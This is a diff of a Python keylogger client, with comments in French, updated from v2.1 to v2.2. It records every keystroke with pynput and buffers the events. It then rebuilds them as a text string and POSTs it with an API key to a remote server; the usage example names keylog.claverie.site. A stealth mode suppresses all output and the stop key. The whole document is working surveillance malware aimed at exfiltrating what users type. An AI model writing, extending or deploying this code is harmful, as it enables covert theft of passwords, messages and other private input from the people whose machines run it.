@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
-Keylogger Client v2.1 - Version structurée
+Keylogger Client v2.2 - Compatible backend actuel
 
 - Capture les frappes avec pynput
-- Envoie des événements structurés JSON au serveur Flask
+- Bufferise des événements structurés
+- Reconstruit une chaîne "logs" avant envoi
+- Envoie JSON : {"machine": ..., "logs": ...} + header X-API-Key
 """
 
 import sys
@@ -11,7 +13,7 @@ import time
 import socket
 import subprocess
 
-# Installation automatique des dépendances avec --break-system-packages
+# Installation automatique des dépendances
 try:
     from pynput import keyboard
     import requests
@@ -37,12 +39,11 @@ class KeyloggerClient:
         self.api_key = api_key
         self.stealth = stealth
 
-        # Buffer d'événements structurés
-        # Chaque élément est un dict: {"t": timestamp, "k": "char"/"special", "v": valeur}
+        # Buffer d'événements structurés : {"t": time, "k": "char"/"special", "v": valeur}
         self.buffer = []
-        self.buffer_size = 50          # Nombre max d'événements avant envoi
+        self.buffer_size = 50        # Nombre max d'événements avant envoi
         self.last_send = time.time()
-        self.send_interval = 3         # Envoi max toutes les 3 secondes
+        self.send_interval = 3       # Envoi max toutes les 3 secondes
         self.send_lock = False
 
         # Identifiant machine
@@ -55,10 +56,27 @@ class KeyloggerClient:
             print(f"[✓] Mode    : {'Stealth' if stealth else 'Debug'}")
 
     # ------------------------------------------------------------------ #
-    #    ENVOI AU SERVEUR
+    # ENVOI AU SERVEUR
     # ------------------------------------------------------------------ #
+    def _events_to_logs(self, events):
+        """
+        Re-construit une chaîne 'logs' compatible avec le backend actuel.
+        - char -> caractère directement
+        - special BACKSPACE/DEL/ESC/... -> tag [NOM]
+        """
+        logs_str = ""
+        for e in events:
+            kind = e.get("k")
+            value = e.get("v", "")
+            if kind == "char":
+                logs_str += value
+            elif kind == "special":
+                # mêmes conventions que pour le C++ (tags [ESC], [BACKSPACE], etc.)
+                logs_str += f"[{value}]"
+        return logs_str
+
     def send_keys(self):
-        """Envoie le buffer d'événements au serveur."""
+        """Envoie le buffer d'événements au serveur (en 'logs')."""
         if not self.buffer or self.send_lock:
             return
 
@@ -67,14 +85,19 @@ class KeyloggerClient:
         self.buffer = []
 
         try:
+            logs_str = self._events_to_logs(events_to_send)
+            if not logs_str:
+                # rien de concret à envoyer
+                return
+
             payload = {
                 "machine": self.machine_id,
-                "api_key": self.api_key,
-                "events": events_to_send,
+                "logs": logs_str,
             }
             headers = {
                 "Content-Type": "application/json",
-                "User-Agent": "KeyloggerClient/2.1",
+                "User-Agent": "KeyloggerClient/2.2",
+                "X-API-Key": self.api_key,
             }
 
             resp = requests.post(
@@ -90,7 +113,6 @@ class KeyloggerClient:
             else:
                 if not self.stealth:
                     print(f"\n[✗] Erreur serveur: HTTP {resp.status_code}")
-                # On remet dans le buffer pour retenter plus tard
                 self.buffer = events_to_send + self.buffer
 
         except requests.exceptions.RequestException as e:
@@ -107,7 +129,7 @@ class KeyloggerClient:
             self.send_lock = False
 
     # ------------------------------------------------------------------ #
-    #    GESTION DU BUFFER
+    # GESTION DU BUFFER
     # ------------------------------------------------------------------ #
     def _add_event(self, kind: str, value: str):
         """
@@ -125,7 +147,6 @@ class KeyloggerClient:
         # Affichage console en mode debug
         if not self.stealth:
             if kind == "char":
-                # Pour bien voir les entrées
                 to_show = value
                 if value == "\n":
                     to_show = "\\n"
@@ -142,14 +163,13 @@ class KeyloggerClient:
             self.last_send = now
 
     # ------------------------------------------------------------------ #
-    #    CALLBACKS PYNPUT
+    # CALLBACKS PYNPUT
     # ------------------------------------------------------------------ #
     def on_press(self, key):
         """Appelé à chaque pression de touche."""
         try:
             # Cas des caractères imprimables
             if hasattr(key, "char") and key.char is not None:
-                # key.char peut être déjà un caractère unicode correct
                 self._add_event("char", key.char)
                 return
 
@@ -173,7 +193,6 @@ class KeyloggerClient:
             if key_name in ignore:
                 return
 
-            # Mapping des touches spéciales utiles
             special_map = {
                 "space": " ",
                 "enter": "\n",
@@ -185,14 +204,11 @@ class KeyloggerClient:
 
             if key_name in special_map:
                 mapped = special_map[key_name]
-                # Les vraies séparations de texte restent en "char"
                 if mapped in (" ", "\n", "\t"):
                     self._add_event("char", mapped)
                 else:
-                    # Les contrôles (backspace, etc.) restent distincts
                     self._add_event("special", mapped)
             else:
-                # Autre touche spéciale (ex: "media_play_pause", etc.)
                 self._add_event("special", key_name.upper())
 
         except Exception as e:
@@ -201,13 +217,12 @@ class KeyloggerClient:
 
     def on_release(self, key):
         """Appelé au relâchement d'une touche."""
-        # ESC pour arrêter uniquement en mode debug
         if not self.stealth and key == keyboard.Key.esc:
             print("\n[!] Arrêt demandé (ESC)")
             return False
 
     # ------------------------------------------------------------------ #
-    #    BOUCLE PRINCIPALE
+    # BOUCLE PRINCIPALE
     # ------------------------------------------------------------------ #
     def start(self):
         """Démarre l'écoute du clavier."""
@@ -215,7 +230,7 @@ class KeyloggerClient:
             print("[!] Appuyez sur ESC pour arrêter en mode debug")
             print("-" * 50)
 
-        # Petit ping serveur (optionnel)
+        # Ping serveur (optionnel)
         try:
             r = requests.get(f"{self.server_url}/api/ping", timeout=5)
             if not self.stealth:
@@ -235,18 +250,18 @@ class KeyloggerClient:
         ) as listener:
             listener.join()
 
-        # A la fin, envoie le reste
+        # Envoi du reste
         if self.buffer:
             self.send_keys()
 
 
 # ---------------------------------------------------------------------- #
-#    MAIN
+# MAIN
 # ---------------------------------------------------------------------- #
 def main():
     if len(sys.argv) < 3:
         print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
-        print("Exemple: python3 keylogger_client_v2.py https://keylog.claverie.site MON_API_KEY --stealth")
+        print("Exemple: python3 keylogger_client_v2.py https://api.keylog.claverie.site MON_API_KEY --stealth")
         sys.exit(1)
 
     server_url = sys.argv[1]
